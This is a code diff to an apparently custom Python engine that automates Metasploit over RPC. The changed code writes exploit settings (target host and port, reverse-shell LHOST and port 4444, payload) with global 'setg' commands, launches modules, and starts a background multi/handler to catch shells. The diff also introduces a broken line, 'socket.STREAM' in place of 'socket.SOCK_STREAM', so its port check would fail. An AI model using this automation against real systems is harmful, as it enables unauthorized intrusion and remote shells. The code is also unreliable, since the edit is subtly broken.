@@ -72,7 +72,7 @@ class MetasploitRPCEngine:
 
     def is_port_open(self, port):
         """Checks if a local port is listening."""
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        with socket.socket(socket.AF_INET, socket.STREAM) as s:
             return s.connect_ex(('127.0.0.1', port)) == 0
 
     def kill_stuck_daemon(self):
@@ -204,15 +204,16 @@ class MetasploitRPCEngine:
             msf_console.write(f"use {custom_mod}\n")
             time.sleep(0.5)
 
-            msf_console.write(f"set RHOSTS {target}\n")
-            msf_console.write(f"set RHOST {target}\n")
-            msf_console.write(f"set RPORT {rport}\n")
-            msf_console.write(f"set PAYLOAD {custom_payload}\n")
+            # Use SETG (Set Global) to silently force variables into the MSF memory space.
+            # This completely bypasses the "Unknown datastore option" errors if a module
+            # (like vsftpd) doesn't use LHOST/LPORT!
+            msf_console.write(f"setg RHOSTS {target}\n")
+            msf_console.write(f"setg RHOST {target}\n")
+            msf_console.write(f"setg RPORT {rport}\n")
+            msf_console.write(f"setg LHOST {lhost}\n")
+            msf_console.write(f"setg LPORT 4444\n")
 
-            # Smart Option Parsing: Only set reverse options if the payload is reverse
-            if "reverse" in custom_payload.lower() or "meterpreter" in custom_payload.lower():
-                msf_console.write(f"set LHOST {lhost}\n")
-                msf_console.write(f"set LPORT 4444\n")
+            msf_console.write(f"set PAYLOAD {custom_payload}\n")
 
             # Smart Exploit Detection: Check if it's a local exploit that needs a session
             if "local" in custom_mod or "pe_injection" in custom_mod:
@@ -232,13 +233,14 @@ class MetasploitRPCEngine:
             # Read the MSF console stream to catch exact failure/success messages
             console_output = ""
             with console.status("[bold cyan]Executing and capturing MSF output...[/bold cyan]", spinner="dots"):
-                for _ in range(8):
+                # Poll for up to 15 seconds (10 iterations * 1.5s)
+                for _ in range(10):
                     time.sleep(1.5)
                     out = msf_console.read()
                     if out and out.get('data'):
                         console_output += out['data']
                         # Break early if the exploit finishes successfully or fails explicitly
-                        if any(x in out['data'] for x in ["Exploit completed", "session", "failed", "Command shell"]):
+                        if any(x in out['data'] for x in ["Exploit completed", "session", "failed", "Command shell", "found"]):
                             break
 
             if console_output.strip():
@@ -426,8 +428,10 @@ class MetasploitRPCEngine:
                         msf_console = self.client.consoles.console()
                         msf_console.write("use exploit/multi/handler\n")
                         msf_console.write(f"set PAYLOAD {payload}\n")
-                        msf_console.write(f"set LHOST {lhost}\n")
-                        msf_console.write(f"set LPORT {lport}\n")
+
+                        # Use SETG for the listener as well
+                        msf_console.write(f"setg LHOST {lhost}\n")
+                        msf_console.write(f"setg LPORT {lport}\n")
                         msf_console.write("exploit -j -z\n")
 
                         console.print(
